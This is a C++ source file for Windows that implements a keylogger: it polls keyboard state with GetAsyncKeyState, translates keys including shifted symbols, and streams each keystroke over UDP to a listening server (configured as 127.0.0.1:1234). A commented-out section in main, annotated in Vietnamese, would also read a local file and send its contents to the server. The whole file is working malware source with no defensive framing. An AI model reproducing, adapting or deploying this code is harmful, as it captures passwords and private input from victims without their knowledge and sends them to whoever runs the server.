#include <iostream>
#include <winsock2.h>
#include <string.h>

/* run this program using the console pauser or add your own getch, system("pause") or input loop */
//https://stackoverflow.com/questions/14665543/how-do-i-receive-udp-packets-with-winsock-in-c

//void StartLogging(int network_socket,sockaddr* serverInfo, int len)  // org
//SOCKET
void StartLogging(SOCKET network_socket,sockaddr* serverInfo, int len)
{
    // declare variables
    char *buffer;
    char c;
    int iResult;

    printf("[+] Keylogger running...");

    // detect and send keypresses to the server
    for(;;) {
        for(c=8; c<=222; c++) {
            if(GetAsyncKeyState(c) == -32767) {
                // lowercase letters
                if(((c>64)&&(c<91))&&!(GetAsyncKeyState(0x10)) )
                    {
                        c+=32;
                        //iResult = send(network_socket, &c, sizeof(c), 0);
                        iResult = sendto(network_socket, &c, sizeof(c), 0,serverInfo, len);
                        //sendto(socketC, (const char*)&byteCount, sizeof(byteCount), 0, (sockaddr*)&serverInfo, len);
                        break;
                    }
                    // upercase letters
                    else if((c>64)&&(c<91))
                    {    
                        //iResult = send(network_socket, &c, sizeof(c), 0);
                        iResult = sendto(network_socket, &c, sizeof(c), 0,serverInfo, len);
                        break;
                    }
                    else {
                        
                        switch (c)
                        {
                            case 48:
                            {
                                if(GetAsyncKeyState(0x10))
                                    //iResult = send(network_socket, ")", sizeof(")"), 0);
                                    iResult = sendto(network_socket, ")", sizeof(")"), 0,serverInfo, len);
                                else
                                    //iResult = send(network_socket, "0", sizeof("0"), 0);   
									iResult = sendto(network_socket, "0", sizeof("0"), 0,serverInfo, len);     
                            break;
                            
                            case 49:
                            {
                                if(GetAsyncKeyState(0x10))   
                                    //iResult = send(network_socket, "!", sizeof("!"), 0);
                                    iResult = sendto(network_socket, "!", sizeof("!"), 0,serverInfo, len);
                                else
                                    //iResult = send(network_socket, "1", sizeof("1"), 0);   
									iResult = sendto(network_socket, "1", sizeof("1"), 0,serverInfo, len); 
                                }   
                            break;
                            
                            case 50:
                            {
                                if(GetAsyncKeyState(0x10))
                                    
                                    //iResult = send(network_socket, "@", sizeof("@"), 0);
                                    iResult = sendto(network_socket, "@", sizeof("@"), 0,serverInfo, len);
                                else
                                    //iResult = send(network_socket, "2", sizeof("2"), 0);  
									iResult = sendto(network_socket, "2", sizeof("2"), 0,serverInfo, len);  
                                
                                }
                            break;
                            case 51:
                            {
                                if(GetAsyncKeyState(0x10))
                                    
                                    //iResult = send(network_socket, "#", sizeof("#"), 0);
                                    iResult = sendto(network_socket, "#", sizeof("#"), 0,serverInfo, len);
                                else
                                    //iResult = send(network_socket, "3", sizeof("3"), 0);    
                                    iResult = sendto(network_socket, "3", sizeof("3"), 0,serverInfo, len); 
                                
                                
                                }   
                            break;  
                            case 52:
                            {
                                if(GetAsyncKeyState(0x10))
                                    
                                    //iResult = send(network_socket, "$", sizeof("$"), 0);
                                    iResult = sendto(network_socket, "$", sizeof("$"), 0,serverInfo, len);
                                else
                                    //iResult = send(network_socket, "4", sizeof("4"), 0);  
                                    iResult = sendto(network_socket, "4", sizeof("4"), 0,serverInfo, len);
                                }   
                            break;  
                            case 53:
                            {
                                if(GetAsyncKeyState(0x10))
                                    
                                    //iResult = send(network_socket, "%", sizeof("%"), 0);
                                    iResult = sendto(network_socket, "%", sizeof("%"), 0,serverInfo, len);
                                else
                                    //iResult = send(network_socket, "5", sizeof("5"), 0); 
									iResult = sendto(network_socket, "5", sizeof("5"), 0,serverInfo, len);  
                                }   
                            break;
                            case 54:
                            {
                                if(GetAsyncKeyState(0x10))
                                    
                                    //iResult = send(network_socket, "^", sizeof("^"), 0);
                                    iResult = sendto(network_socket, "^", sizeof("^"), 0,serverInfo, len);
                                else
                                    //iResult = send(network_socket, "6", sizeof("6"), 0);    
                                    iResult = sendto(network_socket, "6", sizeof("6"), 0,serverInfo, len);
                                }   
                            break;
                            case 55:
                            {
                                if(GetAsyncKeyState(0x10))
                                    
                                    //iResult = send(network_socket, "&", sizeof("&"), 0);
                                    iResult = sendto(network_socket, "&", sizeof("&"), 0,serverInfo, len);
                                else
                                    //iResult = send(network_socket, "7", sizeof("7"), 0); 
									iResult = sendto(network_socket, "7", sizeof("7"), 0,serverInfo, len);  
                                }   
                            break;
                            case 56:
                            {
                                if(GetAsyncKeyState(0x10))
                                    
                                    //iResult = send(network_socket, "*", sizeof("*"), 0);
                                    iResult = sendto(network_socket, "*", sizeof("*"), 0,serverInfo, len);
                                else
                                    //iResult = send(network_socket, "8", sizeof("8"), 0); 
									iResult = sendto(network_socket, "8", sizeof("8"), 0,serverInfo, len);   
                                }   
                            break;
                            case 57:
                            {
                                if(GetAsyncKeyState(0x10))
                                    
                                    //iResult = send(network_socket, "(", sizeof("("), 0);
                                    iResult = sendto(network_socket, "(", sizeof("("), 0,serverInfo, len);
                                else
                                    //iResult = send(network_socket, "9", sizeof("9"), 0); 
									iResult = sendto(network_socket, "9", sizeof("9"), 0,serverInfo, len);  
                                }   
                            break;
                            
                            case VK_SPACE:
                                //iResult = send(network_socket, " ", sizeof(" "), 0);
                                iResult = sendto(network_socket, " ", sizeof(" "), 0,serverInfo, len);
                                break;
                            case VK_RETURN:
                                //iResult = send(network_socket, "\n", sizeof("\n"), 0);
                                iResult = sendto(network_socket, "\n", sizeof("\n"), 0,serverInfo, len);
                                break;  
                            case VK_TAB:
                                //iResult = send(network_socket, "<Tab>", sizeof("  "), 0);
                                iResult = sendto(network_socket, "<Tab>", sizeof("  "), 0,serverInfo, len);
                                break;
                            case VK_BACK:
                                //iResult = send(network_socket, "<Bk>", sizeof("<Bk>"), 0);
                                iResult = sendto(network_socket, "<Bk>", sizeof("<Bk>"), 0,serverInfo, len);
                                break;
                            case VK_DELETE:
                                //iResult = send(network_socket, "<Del>", sizeof("<Del>"), 0);
                                iResult = sendto(network_socket, "<Del>", sizeof("<Del>"), 0,serverInfo, len);
                                break;
                            }  
                        }
                    }
                // exit if problem sending to server
                if(iResult <= 0) {
                    printf("\n[+] Disconnected");
                    exit(1);
                }    
            }
        }
    }
}
int main(int argc, char** argv) {
	WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET socketC;

    struct sockaddr_in serverInfo;
    
    int len = sizeof(serverInfo);
    serverInfo.sin_family = AF_INET;
    serverInfo.sin_port = htons(1234);
    serverInfo.sin_addr.s_addr = inet_addr("127.0.0.1");

    socketC = socket(AF_INET,SOCK_DGRAM,0);
    
   /*
    FILE *fp=fopen("c:\\vd.txt","rb");
    if(fp==NULL)
    {
    	printf("file ko mo duoc\n");
    	return -1;
	}
	//chuyen xuong cuoi file
	fseek(fp,0L,SEEK_END);
	int byteCount=ftell(fp);
	printf("file co do dai = %i\n",byteCount);
	// quay ve dau file
	fseek(fp,0L,SEEK_SET);
	//doc noi dung file
	unsigned char *byteFile=new unsigned char[byteCount];
	if(byteFile==NULL)
	{
		printf("khong cap phat duoc\n");
		closesocket(socketC);
       	fclose(fp);
       	return -1;
	}
	// doc toan bo file vao bo nho byteFile, file kich thuoc nho thi doc toan bo 1 lan
	int countRead=fread(byteFile,1,byteCount,fp);
	if(countRead!=byteCount)
	{
		printf("khong doc file hop le\n");
		closesocket(socketC);
       	fclose(fp);
       	delete [] byteFile;
       	return -1;
	}
	
	/////////////////////////////
	// gui toi server xau begin va vao vong lap cho ready
	char buffer[1024];
	strcpy(buffer,"begin");
	if (sendto(socketC, buffer, sizeof(buffer), 0, (sockaddr*)&serverInfo, len) == SOCKET_ERROR)
	{
		printf("khong gui duoc\n");
		closesocket(socketC);
       	fclose(fp);
       	delete [] byteFile;
       	return -1;
	}
	while(1)
	{
		 if (recvfrom(socketC, buffer, sizeof(buffer), 0, (sockaddr*)&serverInfo, &len) != SOCKET_ERROR)
		 {
		 	if(strcmp(buffer,"ready")==0)
			 {
		 		printf("Server da san sang\n");
				 break;	
			 }
		 }
	}
	printf("Gui toi server do dai file\n");
	// bat dau gui do dai file va noi dung file
	sendto(socketC, (const char*)&byteCount, sizeof(byteCount), 0, (sockaddr*)&serverInfo, len);
	sendto(socketC, (const char*)byteFile, byteCount, 0, (sockaddr*)&serverInfo, len);
	*/
	 // Stay connected to server until client exits or connection is lost
	 bool keepAlive = true;
	int network_socket, iResult;
    while(keepAlive) {
        // run keylogger function
        StartLogging(socketC,(sockaddr*)&serverInfo,len);
    }
	
	
	
	
	
	/////////////////////////////
    closesocket(socketC);
    
    //fclose(fp);
    //delete [] byteFile;
    return(0);
}
